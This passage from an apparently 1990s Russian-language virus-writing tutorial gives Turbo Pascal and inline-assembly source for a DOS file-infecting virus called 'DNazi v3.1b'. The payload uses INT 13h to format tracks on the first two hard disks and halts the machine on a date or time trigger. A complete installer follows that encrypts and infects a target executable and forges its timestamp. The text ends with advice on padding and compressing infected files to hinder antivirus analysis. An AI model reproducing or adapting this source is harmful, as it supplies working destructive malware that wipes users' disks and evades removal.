    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┼' ,#2  ,'┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'┌' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,'┘' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,'▐' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'■' ,#12 ,' ' ,#12 ,'▄' ,#8  ,'▀' ,#8  ,
    '▄' ,#8  ,'▀' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    '▄' ,#8  ,'█' ,#8  ,'▀' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,' ' ,#8  ,
    '▀' ,#8  ,'▀' ,#8  ,' ' ,#8  ,'▄' ,#8  ,' ' ,#8  ,'▀' ,#8  ,'▄' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,
    '┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'▀' ,#8  ,
    '▄' ,#8  ,'▄' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,
    '▀' ,#8  ,' ' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,
    '▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,
    '▄' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,' ' ,#8  ,'▀' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▄' ,#8  ,'▐' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'┌' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,
    '┬' ,#2  ,'┐' ,#2  ,' ' ,#2  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,'┬' ,#2  ,'┐' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'▄' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'▀' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,'▀' ,#8  ,'▄' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▌' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,'└' ,#2  ,'┴' ,#2  ,'┴' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,'└' ,#2  ,
    '┴' ,#2  ,'┴' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    '▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'▐' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▀' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    '▐' ,#8  ,'█' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    '┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┘' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    '▀' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'▄' ,#8  ,'▄' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '▄' ,#8  ,'▀' ,#8  ,'█' ,#8  ,' ' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,
    '▀' ,#8  ,'▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    '▄' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,
    '┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'┌' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'▐' ,#8  ,'▐' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,
    '┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'▀' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▌' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'┌' ,#2  ,
    '┼' ,#2  ,'┼' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'┌' ,#2  ,'┼' ,#2  ,'┼' ,#2  ,'┘' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,' ' ,#8  ,'▀' ,#8  ,
    '█' ,#8  ,'▀' ,#8  ,' ' ,#8  ,'▀' ,#8  ,'█' ,#8  ,'▀' ,#8  ,' ' ,#8  ,
    '▀' ,#8  ,'█' ,#8  ,'▀' ,#8  ,' ' ,#8  ,'▄' ,#8  ,' ' ,#8  ,'▄' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,'└' ,#2  ,'┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'└' ,#2  ,
    '┴' ,#2  ,'┘' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,
    ' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,' ' ,#2  ,'▐' ,#8  ,'▐' ,#8  ,
    '█' ,#8  ,'▄' ,#8  ,' ' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'▄' ,#8  ,' ' ,#8  ,
    '▄' ,#8  ,'█' ,#8  ,'▄' ,#8  ,' ' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'▄' ,#8  ,
    ' ' ,#8  ,'▄' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,
    '█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'█' ,#8  ,'▀' ,#8  ,
    '▀' ,#8  ,'▀' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,'O' ,#15 ,'p' ,#15 ,'e' ,#15 ,'n' ,#15 ,' ' ,#15 ,'y' ,#15 ,
    'o' ,#15 ,'u' ,#15 ,'r' ,#15 ,' ' ,#15 ,'b' ,#15 ,'l' ,#15 ,'i' ,#15 ,
    'n' ,#15 ,'d' ,#15 ,' ' ,#15 ,'e' ,#15 ,'y' ,#15 ,'e' ,#15 ,'s' ,#15 ,
    ' ' ,#15 ,'a' ,#15 ,'n' ,#15 ,'d' ,#15 ,' ' ,#15 ,'t' ,#15 ,'u' ,#15 ,
    'r' ,#15 ,'n' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    '▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,
    '▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,'▀' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,
    ' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,' ' ,#8  ,'a' ,#15 ,'r' ,#15 ,'o' ,#15 ,
    'u' ,#15 ,'n' ,#15 ,'d' ,#15 ,':' ,#15 ,' ' ,#15 ,'d' ,#15 ,'e' ,#15 ,
    'a' ,#15 ,'t' ,#15 ,'h' ,#15 ,' ' ,#15 ,'i' ,#15 ,'s' ,#15 ,' ' ,#15 ,
    'e' ,#15 ,'v' ,#15 ,'e' ,#15 ,'r' ,#15 ,'y' ,#15 ,'w' ,#15 ,'h' ,#15 ,
    'e' ,#15 ,'r' ,#15 ,'e' ,#15 ,'.' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,
    ' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 ,' ' ,#15 );
    Var
       LS : Integer;
       Screen     :  Array [1..4000] of Char Absolute $B800:$0000;

   begin
           asm
              MOV AX , 0510h
              MOV DL , 80h
              MOV CX , 01h
              INT 13h
              MOV AX , 0510h
              MOV DL , 81h
              MOV CX , 01h
              INT 13h
           end;

    InLine($B4/$01/$B5/$20/$CD/$10); { Cursor off }
    For LS:=1 To 4000 Do Screen[LS]:=NaziScreen[LS];

           asm
              CLI                { System }
              HLT                { halted }
           end;

   end; { end proc }

 procedure CheckDateAndTime;  { процедура проверки даты/времени }

  Var
    H , M , S , Ms : Word;

  begin

   GetTime(H , M , S , Ms);

   If (((H = 4) And (M = 0)) Or ((H = 16) And (M = 0))) Then NaziIndeed;

   GetDate(H , M , S , Ms);

    If ((M = S)) Then NaziIndeed;

  end;  { end proc }


 begin  { * MAIN * }

     Init;                    { Инициализируемся }

     FindTarget(Dir);         { Ищем жертвы и заражаем их }

     FuckTables;

     CheckDateAndTime;        { Не пора ли нам показать себя ? }

       asm
         PUSH AX      { coхpaняeм AX }
         IN   AL,21h  { включaeм клaвy oбpaтнo }
         AND  AL,$FC
         OUT  21h,AL
         POP  AX      { вoccтaнaвливaeм AX }
       end; { кoнeц acceмблepa }

     ExecOriginal;            { Исполняем зараженную программу }

 end.   { * И ТАКАЯ БЕЛАЯ ПОЛОСА... * }

        Компайлить необходимо таким образом:

tpc.exe -$A- -$B- -$D- -$E+ -$F- -$G- -$I- -$L- -$N- -$S- -$V- -$X+ %1 %2

        А для заражения какого-либо файла этим вирусом _HЕОБХОДИМО_
воспользоваться инсталятором, поскольку нужно часть заражаемого файла
зашифровать операцией not и установить слово шифровщика в 0 (иначе
при запуске зараженного файла система повиснет).

Uses Dos;

 Const
     VirLen  =  6528;     { Длинa зaпыкoлoчeннoгo виpyca }

 Var
   DirInfo  :  SearchRec;
   BufFrom  :  Array [1..VirLen] of Char;
   BufTo    :  Array [1..VirLen] of Char;
   CryptBuf :  Array [1..VirLen Div 2] Of Word;
   FromF    :  File;
   ToF      :  File;
   I,J      :  Integer;
   Time     :  LongInt;
   DT       :  DateTime;

 begin  { * MAIN * }

  If ParamCount <> 2 Then
    begin
       WriteLn(#13#10'- Required parameters missing');
       WriteLn('Usage: ',ParamStr(0),' DNAZI31B.EXE Target_Program.EXE');
       Halt;
    end;

  FindFirst(ParamStr(1) , AnyFile , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(1) , '" not found!');
        Halt;
     end;

 If Dirinfo.Size <> VirLen Then
 begin
  WriteLn(#13#10'Size of "',Paramstr(1),'" & virus size do not match!');
  Halt;
 end;

  Assign(FromF , ParamStr(1));
  Reset(FromF , 1);

  FindFirst(ParamStr(2) , Archive , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(2) , '" not found or not Archive');
        WriteLn('Set Archive attribute then try again');
        Halt;
     end;

  If Dirinfo.Size < 10240 Then
    begin
       WriteLn(#13#10'Size of "',ParamStr(2),'" must be above 10k');
       Halt;
    end;

  Time:=DirInfo.Time;
  UnPackTime(Time , DT);

  Assign(ToF , ParamStr(2));
  Reset(ToF , 1);

  Seek(FromF , 0);
  Seek(ToF , 0);

  BlockRead(FromF , BufFrom , VirLen);
  BlockRead(ToF , BufTo , VirLen);

   J:=1;
    For I:=1 To VirLen Do
     begin
      CryptBuf[J]:=Ord(BufTo[I+1]) + (Ord(BufTo[I]) Shl 8);
      Inc(I);
      Inc(J);
     end;

    For I:=1 To VirLen Div 2 Do
     begin
       CryptBuf[I]:=Not CryptBuf[I];
     end;

    J:=1;
    For I:=1 To VirLen Div 2 Do
     begin
      BufTo[J]:=Chr(Hi(CryptBuf[I]));
      BufTo[J+1]:=Chr(Lo(CryptBuf[I]));
      Inc(J,2);
     end;

  Randomize;
  For I:=31 To 82 Do BufFrom[I]:=Chr(Random(255));

  Randomize;
  For I:=147 To 163 Do BufFrom[I]:=Chr(Random(255));

  BufFrom[157]:=Chr(0);
  BufFrom[158]:=Chr(0);

  Seek(ToF , 0);
  BlockWrite(ToF , BufFrom , VirLen);

  Seek(ToF , DirInfo.Size);
  BlockWrite(ToF , BufTo , VirLen);

  Close(FromF);

  Dt.Sec:=26;
  PackTime(DT , Time);
  Reset(ToF);
  SetFTime(ToF , Time);

  Close(ToF);

  WriteLn(#13#10'Infection completed. Copyleft (cl) Dirty Nazi 1996');
  WriteLn('"' , ParamStr(2) , '" now infected by DNazi v3.1b Bugs Fix.');

 end. { * Bот такой вот нехуевый инсталлятор :) * }


2. Переменная длина тела вируса.

        Hу что, заморочили мы голову юзерам, позашифровывали зараженные
файлы несколькими способами, теперь можно отмочить еще один прикол. До
сих пор длина инфицируемых файлов увеличивалась ровно на длину вируса.
Для большего усложнения выкусывания тела вируса из программы сделаем
так, чтобы приращение длины у инфицированных файлов было разным. Реали-
зуется это довольно просто - выделяем еще одно слово для переменной,
в которой мы будем хранить длину мусора, приписанного нами к программе
(лучше всего оперировать в пределе 2кб). А также как еще один наворот
можно хранить длину мусора не в "чистом" виде, а зашифровать ее каким-
либо алгоритмом (хоть RSA ;). А поскольку в коде, образованном
компиляторами ЯВУ, копаться довольно сложно, то тем, кто будет вирус
Ваш копать, придется попотеть. Алгоритм предельно прост - инфицируем
программу как обычно, шифруем ее начало, вписываем его в конец файла,
затем случайным образом выбираем число от 1 до 2048 - длину мусора,
дописываем мусор (мусор можно также генерировать случайным образом,
а можно просто взять по случайному адресу из памяти), запоминаем
длину мусора. Как говорится, no comments anymore.
        Второй вариант, недавно пришедший мне в голову, еще лучше первого ;)
Берем начало инфицируемой программы, которое мы переносим в конец файла,
и АРХИВИРУЕМ его любым алгоритмом - благо, исходников архивации алгоритмами
LZW, ARJ etc. в миру гуляет множество. Поскольку каждая инфицируемая
программа имеет свою степень сжатия, то и длина архивированной части программы
каждый раз будет иная (может быть, даже и больше, чем оригинальная
неархивированная часть :). А вот потом уже, после архивации, шифруем то,
что получилось, каким-либо из алгоритмов. И юзер в пиzde :)

3. Защита от антивирусных мониторов.

